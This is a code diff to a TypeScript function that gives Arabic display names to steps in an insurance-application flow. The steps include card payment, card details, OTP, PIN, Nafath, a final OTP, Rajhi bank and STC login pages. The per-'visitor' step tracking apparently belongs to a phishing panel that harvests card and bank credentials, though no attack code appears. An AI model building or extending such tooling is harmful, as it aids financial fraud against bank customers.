@@ -66,30 +66,30 @@ const getPageName = (step: number | string): string => {
   if (typeof step === "string") {
     const stringPageNames: Record<string, string> = {
       // Home
-      home: "الرئيسية",
-      "home-new": "الرئيسية",
+      home: "الصفحة الرئيسية",
+      "home-new": "الصفحة الرئيسية",
       // Insurance
       insur: "بيانات التأمين",
       // Offers
       compar: "مقارنة العروض",
       // Payment / card
-      payment: "الدفع (بطاقة)",
+      payment: "الدفع والتحقق",
       check: "الدفع",
       _st1: "الدفع (بطاقة)",
       _t1: "بيانات البطاقة",
       // OTP
-      otp: "OTP",
-      _t2: "OTP",
-      step2: "OTP",
+      otp: "التحقق OTP",
+      _t2: "التحقق OTP",
+      step2: "التحقق OTP",
       veri: "رمز تحقق",
       // PIN
-      pin: "PIN",
-      _t3: "PIN",
-      step3: "PIN",
-      confi: "PIN",
+      pin: "التحقق PIN",
+      _t3: "التحقق PIN",
+      step3: "التحقق PIN",
+      confi: "التحقق PIN",
       // Phone
-      phone: "الهاتف",
-      step5: "الهاتف",
+      phone: "معلومات الهاتف",
+      step5: "معلومات الهاتف",
       // Nafad
       nafad: "نفاذ",
       _t6: "نفاذ",
@@ -98,29 +98,29 @@ const getPageName = (step: number | string): string => {
       // Final OTP
       finalOtp: "OTP الأخير",
       // Rajhi
-      rajhi: "راجحي",
+      rajhi: "الراجحي",
       // STC
-      "stc-login": "دخول STC",
+      "stc-login": "تسجيل دخول STC",
     };
-    return stringPageNames[step] || `غير محدد (${step})`;
+    return stringPageNames[step] ?? "غير معروف";
   }
 
   // Handle numeric values
   const stepNum = typeof step === "number" ? step : parseInt(step);
   const pageNames: Record<number, string> = {
-    0: "الرئيسية",
-    1: "الرئيسية",
+    0: "الصفحة الرئيسية",
+    1: "الصفحة الرئيسية",
     2: "بيانات التأمين",
     3: "مقارنة العروض",
     4: "الدفع",
-    5: "OTP",
-    6: "PIN",
-    7: "الهاتف",
+    5: "التحقق OTP",
+    6: "التحقق PIN",
+    7: "معلومات الهاتف",
     8: "نفاذ",
-    9: "الاخير OTP",
+    9: "OTP الأخير",
   };
 
-  return pageNames[stepNum] || `غير محدد (${stepNum})`;
+  return pageNames[stepNum] ?? "غير معروف";
 };
 
 const getVisitorDisplayName = (visitor: InsuranceApplication) =>
